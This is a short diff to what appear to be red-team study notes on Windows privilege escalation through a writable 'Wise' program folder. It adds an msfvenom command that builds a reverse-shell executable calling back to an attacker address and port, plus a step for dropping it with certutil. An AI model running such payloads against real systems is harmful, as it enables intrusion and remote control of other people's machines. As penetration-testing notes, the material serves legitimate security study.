@@ -435,10 +435,13 @@ Navigate to target location that presents this vulnerability:
 
     c:\Program Files (x86)\Wise>
 
-Create windows reverse shell TCP via MSFVENOM
+Create windows reverse shell TCP via Msfvenom
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.64.129 LPORT=5555 -f exe > Wisebad.exe
 
 Prepare reverse shell suitable on attacker machine and have it dropped in file location using certutil.
 
-    
+![image](https://github.com/user-attachments/assets/3218c247-1e88-48fa-9328-fd39d0e0ed29)
+
 
 ### RED TEAM - Jenkins exploitation study: https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/
